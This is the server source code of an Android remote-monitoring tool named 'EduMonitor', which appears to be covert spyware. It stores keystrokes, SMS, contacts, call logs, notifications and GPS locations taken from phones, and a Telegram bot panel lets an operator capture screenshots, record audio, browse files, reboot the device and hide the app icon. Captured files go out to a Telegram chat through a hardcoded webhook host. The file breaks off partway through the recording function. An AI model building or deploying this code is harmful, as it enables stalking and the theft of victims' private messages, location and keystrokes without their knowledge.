const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const schedule = require('node-schedule');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);
app.set('trust proxy', 1);

// ============================================
// CONFIGURATION
// ============================================
const config = {
    telegram: {
        token: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
        chatId: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID'
    },
    server: {
        port: process.env.PORT || 8999,
        host: process.env.HOST || '0.0.0.0'
    },
    security: {
        encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
        rateLimit: 100
    },
    storage: {
        maxFileSize: 100 * 1024 * 1024,
        retentionDays: 7
    }
};

// ============================================
// DATABASE SETUP
// ============================================
const db = new sqlite3.Database('./edumonitor.db');

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        name TEXT,
        model TEXT,
        android_version TEXT,
        manufacturer TEXT,
        chat_id TEXT,
        registered_at INTEGER,
        last_seen INTEGER,
        battery_level INTEGER,
        is_active INTEGER DEFAULT 1,
        encryption_key TEXT,
        features TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        command TEXT,
        parameters TEXT,
        status TEXT,
        created_at INTEGER,
        executed_at INTEGER,
        result TEXT,
        priority INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        altitude REAL,
        speed REAL,
        provider TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS media (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        type TEXT,
        file_path TEXT,
        thumbnail_path TEXT,
        size INTEGER,
        timestamp INTEGER,
        metadata TEXT,
        uploaded INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        package TEXT,
        text TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS notifications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        package TEXT,
        title TEXT,
        text TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        name TEXT,
        number TEXT,
        contact_id TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS sms_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        address TEXT,
        body TEXT,
        date INTEGER,
        type TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        number TEXT,
        date INTEGER,
        duration TEXT,
        type TEXT,
        name TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS installed_apps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        package TEXT,
        name TEXT,
        isSystem TEXT,
        timestamp INTEGER
    )`);
});

// ============================================
// SECURITY MIDDLEWARE
// ============================================
app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: config.security.rateLimit,
    message: { error: 'Too many requests from this IP' }
});
app.use('/api/', limiter);

// ============================================
// WEBSOCKET SERVER
// ============================================
const wss = new WebSocket.Server({ 
    server, 
    path: '/ws',
    clientTracking: true,
    perMessageDeflate: false
});

// ============================================
// ENCRYPTION UTILITIES
// ============================================
const encryption = {
    encrypt(text, key = config.security.encryptionKey) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return { iv: iv.toString('hex'), encrypted, authTag: authTag.toString('hex') };
    },

    decrypt(encryptedData, key = config.security.encryptionKey) {
        const decipher = crypto.createDecipheriv(
            'aes-256-gcm',
            Buffer.from(key, 'hex'),
            Buffer.from(encryptedData.iv, 'hex')
        );
        decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    },

    generateDeviceKey() {
        return crypto.randomBytes(32).toString('hex');
    }
};

// ============================================
// TELEGRAM BOT INTEGRATION
// ============================================
const TELEGRAM_API = `https://api.telegram.org/bot${config.telegram.token}`;

async function setWebhook() {
    try {
        const webhookUrl = `https://edu2-801s.onrender.com/webhook`;
        await axios.post(`${TELEGRAM_API}/setWebhook`, {
            url: webhookUrl,
            allowed_updates: ["message", "callback_query"]
        });
        console.log('✅ Webhook set');
    } catch (error) {
        console.error('❌ Failed to set webhook:', error.message);
    }
}

async function sendTelegramMessage(chatId, text, options = {}) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            ...options
        });
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
    try {
        if (!fs.existsSync(filePath)) return;
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), filename);
        if (caption) formData.append('caption', caption);

        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
    } catch (error) {
        console.error('Document send error:', error.message);
    }
}

async function editMessageText(chatId, messageId, text, keyboard = null) {
    try {
        const payload = {
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: 'HTML'
        };
        if (keyboard) payload.reply_markup = { inline_keyboard: keyboard };
        await axios.post(`${TELEGRAM_API}/editMessageText`, payload);
    } catch (error) {
        if (!error.response?.data?.description?.includes('message is not modified')) {
            await sendTelegramMessage(chatId, text, {
                reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
            });
        }
    }
}

async function answerCallbackQuery(callbackQueryId) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId
        });
    } catch (error) {
        console.error('Answer callback error:', error.message);
    }
}

// ============================================
// INLINE KEYBOARDS
// ============================================
const MainMenuKeyboard = [
    [{ text: '📱 DEVICES', callback_data: 'menu_devices' }],
    [{ text: '📸 SCREENSHOT', callback_data: 'menu_screenshot' }, { text: '🎤 RECORDING', callback_data: 'menu_recording' }],
    [{ text: '📍 LOCATION', callback_data: 'menu_location' }, { text: '📁 FILES', callback_data: 'menu_files' }],
    [{ text: '📊 DATA EXTRACTION', callback_data: 'menu_data' }],
    [{ text: '⚙️ SETTINGS', callback_data: 'menu_settings' }, { text: '❓ HELP', callback_data: 'menu_help' }]
];

const DevicesMenuKeyboard = (devices) => {
    const keyboard = [];
    devices.forEach(device => {
        const batteryEmoji = getBatteryEmoji(device.battery_level);
        keyboard.push([{ 
            text: `${batteryEmoji} ${device.model || 'Unknown'}`, 
            callback_data: `device_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);
    return keyboard;
};

const DeviceActionKeyboard = (deviceId) => [
    [{ text: 'ℹ️ INFO', callback_data: `info_${deviceId}` }, { text: '📸 SCREENSHOT', callback_data: `screenshot_${deviceId}` }],
    [{ text: '🎤 RECORD (30s)', callback_data: `record_30_${deviceId}` }, { text: '🎤 RECORD (60s)', callback_data: `record_60_${deviceId}` }],
    [{ text: '📍 LOCATION', callback_data: `location_${deviceId}` }, { text: '📁 LIST FILES', callback_data: `files_${deviceId}` }],
    [{ text: '📇 CONTACTS', callback_data: `contacts_${deviceId}` }, { text: '💬 SMS', callback_data: `sms_${deviceId}` }],
    [{ text: '📞 CALL LOGS', callback_data: `calllogs_${deviceId}` }, { text: '📱 APPS', callback_data: `apps_${deviceId}` }],
    [{ text: '⌨️ KEYSTROKES', callback_data: `keystrokes_${deviceId}` }, { text: '🔔 NOTIFICATIONS', callback_data: `notifications_${deviceId}` }],
    [{ text: '🔋 BATTERY', callback_data: `battery_${deviceId}` }, { text: '📡 NETWORK', callback_data: `network_${deviceId}` }],
    [{ text: '💾 STORAGE', callback_data: `storage_${deviceId}` }, { text: '🔄 REBOOT', callback_data: `reboot_${deviceId}` }],
    [{ text: '👻 HIDE ICON', callback_data: `hide_${deviceId}` }, { text: '👁️ SHOW ICON', callback_data: `show_${deviceId}` }],
    [{ text: '🗑️ CLEAR LOGS', callback_data: `clear_${deviceId}` }],
    [{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]
];

// ============================================
// DEVICE MANAGER
// ============================================
class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.wsConnections = new Map();
        this.commandCallbacks = new Map();
        this.pingIntervals = new Map();
        console.log('📱 DeviceManager initialized');
    }

    registerDevice(deviceId, ws, deviceInfo) {
        console.log(`\n🔌 Device ${deviceId} connected`);
        
        const deviceKey = encryption.generateDeviceKey();
        
        const device = {
            id: deviceId,
            ws,
            info: deviceInfo,
            registeredAt: Date.now(),
            lastSeen: Date.now(),
            key: deviceKey,
            batteryLevel: deviceInfo.battery,
            pendingCommands: []
        };

        this.devices.set(deviceId, device);
        this.wsConnections.set(ws, deviceId);
        
        // Set up ping interval for this device
        const pingInterval = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
            }
        }, 30000);
        this.pingIntervals.set(ws, pingInterval);
        
        return device;
    }

    updateDevice(deviceId, data) {
        const device = this.devices.get(deviceId);
        if (device) {
            Object.assign(device, data);
            device.lastSeen = Date.now();
        }
    }

    sendCommand(deviceId, command, parameters = {}, callback = null) {
        const device = this.devices.get(deviceId);
        if (!device) return { success: false, error: 'Device not found' };

        const commandId = uuidv4();
        const cmd = { id: commandId, command, parameters, timestamp: Date.now() };

        if (callback) {
            this.commandCallbacks.set(commandId, callback);
            setTimeout(() => {
                if (this.commandCallbacks.has(commandId)) {
                    this.commandCallbacks.delete(commandId);
                    callback(false, null, 'Command timeout');
                }
            }, 30000);
        }

        try {
            if (device.ws?.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify({ type: 'command', id: commandId, data: cmd }));
                db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
                    VALUES (?, ?, ?, ?, 'sent', ?)`,
                    [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                );
                return { success: true, commandId };
            }
            device.pendingCommands.push(cmd);
            return { success: true, commandId, queued: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    disconnectDevice(deviceId) {
        const device = this.devices.get(deviceId);
        if (device) {
            const pingInterval = this.pingIntervals.get(device.ws);
            if (pingInterval) clearInterval(pingInterval);
            this.pingIntervals.delete(device.ws);
            this.wsConnections.delete(device.ws);
            this.devices.delete(deviceId);
            db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
            console.log(`🔌 Device ${deviceId} disconnected`);
        }
    }

    getConnectedDevices() {
        return Array.from(this.devices.values());
    }
}

const deviceManager = new DeviceManager();

// ============================================
// WEBSOCKET MESSAGE HANDLER
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    let deviceInfo = {};
    
    try {
        deviceInfo = JSON.parse(req.headers['device-info'] || '{}');
    } catch (e) {}

    if (!deviceId) {
        ws.close(1008, 'Device ID required');
        return;
    }

    const device = deviceManager.registerDevice(deviceId, ws, {
        ...deviceInfo,
        chatId: config.telegram.chatId
    });

    ws.send(JSON.stringify({ type: 'registered', deviceId: device.id, timestamp: Date.now() }));

    sendTelegramMessage(config.telegram.chatId, 
        `✅ *Device Connected*\nModel: ${device.info.model || 'Unknown'}`,
        { parse_mode: 'Markdown' }
    );

    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            if (!message.type) return;
            
            switch (message.type) {
                case 'register':
                    ws.send(JSON.stringify({ type: 'registered', deviceId, timestamp: Date.now() }));
                    break;

                case 'pong':
                    deviceManager.updateDevice(deviceId, { lastSeen: Date.now() });
                    break;

                case 'response':
                    await handleDeviceResponse(deviceId, message);
                    break;

                case 'location':
                    await handleDeviceLocation(deviceId, message.data);
                    break;

                case 'battery':
                    deviceManager.updateDevice(deviceId, { batteryLevel: message.level });
                    db.run(`UPDATE devices SET battery_level = ? WHERE id = ?`, [message.level, deviceId]);
                    break;
                    
                case 'keystroke':
                    await handleKeystroke(deviceId, message.data);
                    break;
                    
                case 'notification':
                    await handleNotification(deviceId, message.data);
                    break;
                    
                case 'contacts':
                    await handleContacts(deviceId, message.data);
                    break;
                    
                case 'sms':
                    await handleSMS(deviceId, message.data);
                    break;
                    
                case 'call_logs':
                    await handleCallLogs(deviceId, message.data);
                    break;
                    
                case 'installed_apps':
                    await handleInstalledApps(deviceId, message.data);
                    break;
                    
                case 'screenshot_result':
                    await handleScreenshotResult(deviceId, message);
                    break;
                    
                case 'recording_result':
                    await handleRecordingResult(deviceId, message);
                    break;
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', () => {
        deviceManager.disconnectDevice(deviceId);
        sendTelegramMessage(config.telegram.chatId, 
            `❌ *Device Disconnected*\nModel: ${device.info.model || 'Unknown'}`);
    });

    ws.on('error', (error) => {
        console.error(`WebSocket error for device ${deviceId}:`, error.message);
    });
});

// ============================================
// DATA HANDLERS
// ============================================
async function handleDeviceResponse(deviceId, message) {
    const { commandId, success, data, error } = message;
    
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
        [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
    );

    const callback = deviceManager.commandCallbacks.get(commandId);
    if (callback) {
        callback(success, data, error);
        deviceManager.commandCallbacks.delete(commandId);
    }
}

async function handleScreenshotResult(deviceId, message) {
    const { commandId, filePath, fileSize } = message;
    
    const callback = deviceManager.commandCallbacks.get(commandId);
    if (callback) {
        callback(true, { filePath, fileSize }, null);
        deviceManager.commandCallbacks.delete(commandId);
    }
    
    sendTelegramMessage(config.telegram.chatId, 
        `📸 *Screenshot captured*\nSize: ${formatFileSize(fileSize)}`);
}

async function handleRecordingResult(deviceId, message) {
    const { commandId, filePath, duration, fileSize } = message;
    
    const callback = deviceManager.commandCallbacks.get(commandId);
    if (callback) {
        callback(true, { filePath, duration, fileSize }, null);
        deviceManager.commandCallbacks.delete(commandId);
    }
    
    sendTelegramMessage(config.telegram.chatId, 
        `🎤 *Recording captured*\nDuration: ${duration}s\nSize: ${formatFileSize(fileSize)}`);
}

async function handleDeviceLocation(deviceId, locationData) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) return;

    db.run(`INSERT INTO locations (device_id, latitude, longitude, accuracy, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)`,
        [deviceId, locationData.lat, locationData.lon, locationData.accuracy, 
         locationData.provider, locationData.timestamp || Date.now()]
    );

    const mapsUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
    await sendTelegramMessage(config.telegram.chatId, 
        `📍 *Location from ${device.info.model || 'Device'}*\n\n` +
        `Lat: \`${locationData.lat}\`\nLon: \`${locationData.lon}\`\n` +
        `Accuracy: ±${locationData.accuracy}m\nProvider: ${locationData.provider}\n\n` +
        `[View on Google Maps](${mapsUrl})`, { parse_mode: 'Markdown' });
}

async function handleKeystroke(deviceId, data) {
    db.run(`INSERT INTO keystrokes (device_id, package, text, timestamp) VALUES (?, ?, ?, ?)`,
        [deviceId, data.package, data.text, data.timestamp || Date.now()]);
}

async function handleNotification(deviceId, data) {
    db.run(`INSERT INTO notifications (device_id, package, title, text, timestamp) VALUES (?, ?, ?, ?, ?)`,
        [deviceId, data.package, data.title, data.text, data.timestamp || Date.now()]);
}

async function handleContacts(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO contacts (device_id, name, number, contact_id, timestamp) VALUES (?, ?, ?, ?, ?)`);
    data.contacts?.forEach(contact => {
        stmt.run([deviceId, contact.name, contact.number, contact.id, Date.now()]);
    });
    stmt.finalize();
}

async function handleSMS(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO sms_messages (device_id, address, body, date, type, timestamp) VALUES (?, ?, ?, ?, ?, ?)`);
    data.messages?.forEach(msg => {
        stmt.run([deviceId, msg.address, msg.body, msg.date, msg.type, Date.now()]);
    });
    stmt.finalize();
}

async function handleCallLogs(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO call_logs (device_id, number, date, duration, type, name, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)`);
    data.logs?.forEach(log => {
        stmt.run([deviceId, log.number, log.date, log.duration, log.type, log.name, Date.now()]);
    });
    stmt.finalize();
}

async function handleInstalledApps(deviceId, data) {
    const stmt = db.prepare(`INSERT INTO installed_apps (device_id, package, name, isSystem, timestamp) VALUES (?, ?, ?, ?, ?)`);
    data.apps?.forEach(app => {
        stmt.run([deviceId, app.package, app.name, app.isSystem, Date.now()]);
    });
    stmt.finalize();
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: deviceManager.devices.size,
        timestamp: Date.now()
    });
});

app.post('/api/register', (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

    const deviceKey = encryption.generateDeviceKey();
    
    db.run(`INSERT OR REPLACE INTO devices 
        (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [deviceId, deviceInfo?.model || 'Unknown', deviceInfo?.android || 'Unknown',
         deviceInfo?.manufacturer || 'Unknown', chatId || config.telegram.chatId,
         Date.now(), Date.now(), deviceInfo?.battery || 100, deviceKey,
         JSON.stringify(deviceInfo?.features || [])],
        function(err) {
            if (err) return res.status(500).json({ error: 'Database error' });
            
            sendTelegramMessage(config.telegram.chatId, 
                `✅ *New Device Registered*\nID: \`${deviceId.substring(0, 8)}...\`\nModel: ${deviceInfo?.model || 'Unknown'}`,
                { parse_mode: 'Markdown' }
            );
            
            res.json({ success: true, deviceId, key: deviceKey, serverTime: Date.now() });
        }
    );
});

const upload = multer({ dest: 'uploads/', limits: { fileSize: config.storage.maxFileSize } });

app.post('/api/upload-file', upload.single('file'), (req, res) => {
    try {
        const { deviceId, fileType, caption, filename } = req.body;
        const file = req.file;
        if (!deviceId || !file) return res.status(400).json({ error: 'Missing fields' });

        const mediaId = uuidv4();
        const fileExt = path.extname(filename || file.originalname);
        const newPath = path.join('uploads', `${mediaId}${fileExt}`);
        fs.renameSync(file.path, newPath);

        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [mediaId, deviceId, fileType || 'unknown', newPath, file.size, Date.now(), 
             JSON.stringify({ caption, filename })],
            function(err) {
                if (err) return res.status(500).json({ error: 'Database error' });
                
                db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
                    if (!err && device) {
                        sendTelegramDocument(config.telegram.chatId, newPath, 
                            filename || file.originalname,
                            `${caption || '📎 File'} from ${device.model || 'Device'}`);
                    }
                });
                
                res.json({ success: true, mediaId });
            }
        );
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/location/:deviceId', (req, res) => {
    handleDeviceLocation(req.params.deviceId, req.body);
    res.json({ success: true });
});

app.get('/api/data/:deviceId/:type', (req, res) => {
    const { deviceId, type } = req.params;
    const { format } = req.query;
    
    const tables = {
        keystrokes: 'keystrokes',
        notifications: 'notifications',
        contacts: 'contacts',
        sms: 'sms_messages',
        calllogs: 'call_logs',
        apps: 'installed_apps'
    };
    
    const tableName = tables[type];
    if (!tableName) return res.status(400).json({ error: 'Invalid type' });
    
    db.all(`SELECT * FROM ${tableName} WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1000`, 
        [deviceId], (err, rows) => {
            if (err) return res.status(500).json({ error: 'Database error' });
            
            if (format === 'json') res.json(rows);
            else if (format === 'csv') {
                if (!rows?.length) return res.send('No data');
                const headers = Object.keys(rows[0]).join(',');
                const csv = rows.map(row => Object.values(row).join(',')).join('\n');
                res.header('Content-Type', 'text/csv').send(headers + '\n' + csv);
            } else res.json(rows);
        }
    );
});

// ============================================
// TELEGRAM WEBHOOK HANDLER
// ============================================
app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    const update = req.body;

    try {
        if (update.message) await handleTelegramMessage(update.message);
        else if (update.callback_query) await handleTelegramCallback(update.callback_query);
    } catch (error) {
        console.error('Webhook error:', error.message);
    }
});

async function handleTelegramMessage(message) {
    const chatId = message.chat.id;
    const text = message.text;
    if (chatId.toString() !== config.telegram.chatId || !text) return;

    if (text === '/start' || text === '/help' || text === '/menu') {
        await sendTelegramMessage(chatId, '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
            { parse_mode: 'Markdown', reply_markup: { inline_keyboard: MainMenuKeyboard } });
    } else if (text === '/devices') {
        await showDevicesMenu(chatId, message.message_id);
    }
}

async function handleTelegramCallback(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    await answerCallbackQuery(callbackQuery.id);

    const handlers = {
        'menu_main': () => editMessageText(chatId, messageId,
            '🤖 *EduMonitor Control Panel*\n\nSelect an option below:', MainMenuKeyboard),
        'menu_devices': () => showDevicesMenu(chatId, messageId),
        'menu_screenshot': () => showScreenshotMenu(chatId, messageId),
        'menu_recording': () => showRecordingMenu(chatId, messageId),
        'menu_location': () => showLocationMenu(chatId, messageId),
        'menu_files': () => showFilesMenu(chatId, messageId),
        'menu_data': () => showDataExtractionMenu(chatId, messageId),
        'menu_help': () => showHelpMenu(chatId, messageId)
    };

    if (handlers[data]) {
        await handlers[data]();
    } else if (data.startsWith('device_')) {
        await showDeviceDetails(chatId, messageId, data.substring(7));
    } else if (data.startsWith('screenshot_')) {
        await takeScreenshot(chatId, messageId, data.substring(11));
    } else if (data.startsWith('record_')) {
        const parts = data.split('_');
        await startRecording(chatId, messageId, parts.slice(2).join('_'), parseInt(parts[1]));
    } else if (data.startsWith('location_')) {
        await getLocation(chatId, messageId, data.substring(9));
    } else if (data.startsWith('files_')) {
        await listFiles(chatId, messageId, data.substring(6));
    } else if (data.startsWith('battery_')) {
        await getBatteryStatus(chatId, messageId, data.substring(8));
    } else if (data.startsWith('network_')) {
        await getNetworkInfo(chatId, messageId, data.substring(8));
    } else if (data.startsWith('storage_')) {
        await getStorageInfo(chatId, messageId, data.substring(8));
    } else if (data.startsWith('info_')) {
        await getDeviceInfo(chatId, messageId, data.substring(5));
    }
}

// ============================================
// MENU FUNCTIONS
// ============================================
async function showDevicesMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1 ORDER BY last_seen DESC', [], async (err, devices) => {
        if (err) return await editMessageText(chatId, messageId, '❌ Error fetching devices');

        if (!devices?.length) {
            return await editMessageText(chatId, messageId,
                '📭 *No Devices Connected*\n\nNo devices are currently connected.',
                [[{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, 
                  { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
        }

        await editMessageText(chatId, messageId,
            `📱 *Connected Devices (${devices.length})*\n\nSelect a device to control:`,
            DevicesMenuKeyboard(devices));
    });
}

async function showDeviceDetails(chatId, messageId, deviceId) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
        if (err || !device) {
            return await editMessageText(chatId, messageId,
                '❌ *Device Not Found*',
                [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]]);
        }

        await editMessageText(chatId, messageId,
            `📱 *Device Details*\n\n*Model:* ${device.model || 'Unknown'}\n` +
            `*Android:* ${device.android_version || 'Unknown'}\n` +
            `*Battery:* ${getBatteryEmoji(device.battery_level)} ${device.battery_level || '?'}%\n` +
            `*Last Seen:* ${new Date(device.last_seen).toLocaleString()}\n\n*Select an action:*`,
            DeviceActionKeyboard(deviceId));
    });
}

async function showScreenshotMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices?.length) {
            return editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
        }

        const keyboard = devices.map(device => 
            [{ text: `📸 ${device.model || 'Unknown'}`, callback_data: `screenshot_${device.id}` }]
        );
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📸 *Screenshot Menu*\n\nSelect a device to capture screen:', keyboard);
    });
}

async function showRecordingMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices?.length) {
            return editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
        }

        const keyboard = [];
        devices.forEach(device => {
            keyboard.push([
                { text: `🎤 ${device.model || 'Unknown'} (30s)`, callback_data: `record_30_${device.id}` },
                { text: `🎤 (60s)`, callback_data: `record_60_${device.id}` }
            ]);
        });
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '🎤 *Recording Menu*\n\nSelect a device and duration:', keyboard);
    });
}

async function showLocationMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices?.length) {
            return editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
        }

        const keyboard = devices.map(device => 
            [{ text: `📍 ${device.model || 'Unknown'}`, callback_data: `location_${device.id}` }]
        );
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📍 *Location Menu*\n\nSelect a device to get current location:', keyboard);
    });
}

async function showFilesMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices?.length) {
            return editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
        }

        const keyboard = devices.map(device => 
            [{ text: `📁 ${device.model || 'Unknown'}`, callback_data: `files_${device.id}` }]
        );
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📁 *File Explorer*\n\nSelect a device to browse files:', keyboard);
    });
}

async function showDataExtractionMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices?.length) {
            return editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
        }

        if (devices.length === 1) {
            return editMessageText(chatId, messageId,
                `📊 *Data Extraction - ${devices[0].model || 'Unknown'}*\n\nSelect data type to extract:`,
                DataExtractionKeyboard(devices[0].id));
        }

        const keyboard = devices.map(device => 
            [{ text: `📊 ${device.model || 'Unknown'}`, callback_data: `data_device_${device.id}` }]
        );
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📊 *Data Extraction*\n\nSelect a device:', keyboard);
    });
}

async function showHelpMenu(chatId, messageId) {
    await editMessageText(chatId, messageId,
        '❓ *EduMonitor Help*\n\n*Available Commands:*\n• /start - Show main menu\n• /devices - List all devices\n\n*Features:*\n• 📸 Screenshot capture\n• 🎤 Audio recording\n• 📍 GPS location tracking\n• 📁 File explorer\n• 📊 Data extraction\n• 🔋 Battery monitoring\n• 📡 Network information\n• 💾 Storage information',
        [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]);
}

// ============================================
// COMMAND FUNCTIONS
// ============================================
async function takeScreenshot(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📸 *Taking Screenshot*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);

    const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success) => {
        editMessageText(chatId, messageId,
            success ? `✅ *Screenshot captured successfully!*` : `❌ *Screenshot Failed*`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    }
}

async function startRecording(chatId, messageId, deviceId, seconds) {
    await editMessageText(chatId, messageId,
        `🎤 *Starting Recording*\n\nDuration: ${seconds}s\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);

    const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success) => {
